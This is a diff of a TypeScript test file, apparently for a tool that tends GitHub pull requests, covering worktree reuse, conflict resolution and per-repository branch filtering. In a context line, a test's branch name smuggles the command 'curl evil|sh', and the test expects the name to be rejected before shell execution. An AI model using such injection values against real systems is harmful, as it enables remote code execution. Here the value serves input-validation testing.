@@ -108,6 +108,24 @@ describe("babysitPr", () => {
     expect(h.agentCalls).toHaveLength(0);
   });
 
+  test("既に checkout 済みのブランチはその worktree を再利用する", async () => {
+    const h = makeDeps({});
+    const deps = h.deps as { exec: (cmd: string, opts?: { cwd?: string }) => Promise<ExecResult> };
+    const orig = deps.exec;
+    const calls: { cmd: string; cwd?: string }[] = [];
+    deps.exec = async (cmd, opts) => {
+      calls.push({ cmd, cwd: opts?.cwd });
+      if (cmd === "git worktree list --porcelain") {
+        return { code: 0, stdout: "worktree /checkout/serp\nHEAD abc\nbranch refs/heads/serp-api\n", stderr: "" };
+      }
+      return orig(cmd, opts);
+    };
+    await babysitPr(h.deps, { ...PR, headRefName: "serp-api" });
+    expect(calls.some((c) => c.cmd.startsWith("git worktree add"))).toBe(false);
+    const fetch = calls.find((c) => c.cmd === "git fetch origin main");
+    expect(fetch!.cwd).toBe("/checkout/serp");
+  });
+
   test("危険なブランチ名はシェル実行前に拒否される", async () => {
     const h = makeDeps({});
     expect(babysitPr(h.deps, { ...PR, headRefName: "issue-1;curl evil|sh" })).rejects.toThrow("ref");
@@ -125,7 +143,7 @@ describe("matchesBranch", () => {
 });
 
 describe("runBabysit", () => {
-  test("デフォルトは issue-* ブランチの PR だけを対象にする", async () => {
+  test("コメント対応はデフォルトで issue-* ブランチの PR だけが対象", async () => {
     const h = makeDeps({
       prs: [PR, { number: 200, headRefName: "feature-x", baseRefName: "main", mergeable: "MERGEABLE" }],
     });
@@ -133,7 +151,7 @@ describe("runBabysit", () => {
     expect(results.map((r) => r.number)).toEqual([193]);
   });
 
-  test("babysitBranches 設定でリポジトリごとに対象を決められる", async () => {
+  test("babysitBranches 設定でコメント対応の対象をリポジトリごとに決められる", async () => {
     const h = makeDeps({
       babysitBranches: ["issue-*", "serp-api"],
       prs: [
@@ -144,5 +162,32 @@ describe("runBabysit", () => {
     });
     const results = await runBabysit(h.deps);
     expect(results.map((r) => r.number)).toEqual([193, 194]);
+  });
+
+  test("コンフリクト解消は対象外ブランチの PR でも行う（コメント対応はしない）", async () => {
+    const h = makeDeps({
+      mergeFails: true,
+      comments: [
+        { author: "koki", authorAssociation: "OWNER", body: "直して", path: null, createdAt: "2026-07-20T05:00:00Z" },
+      ],
+      lastCommit: "2026-07-20T09:00:00+09:00",
+      prs: [{ number: 200, headRefName: "feature-x", baseRefName: "main", mergeable: "CONFLICTING" }],
+    });
+    const results = await runBabysit(h.deps);
+    expect(results).toEqual([{ number: 200, actions: ["conflict-resolved"] }]);
+    expect(h.agentCalls.some((c) => c.prompt.includes("コンフリクト"))).toBe(true);
+    expect(h.agentCalls.some((c) => c.prompt.includes("レビューコメント"))).toBe(false);
+  });
+
+  test("1 件の失敗が全体を止めない", async () => {
+    const h = makeDeps({
+      prs: [
+        { number: 300, headRefName: "issue-1;evil", baseRefName: "main", mergeable: "CONFLICTING" },
+        PR,
+      ],
+    });
+    const results = await runBabysit(h.deps);
+    expect(results.map((r) => r.number)).toEqual([300, 193]);
+    expect(results[0]!.actions[0]).toContain("error");
   });
 });
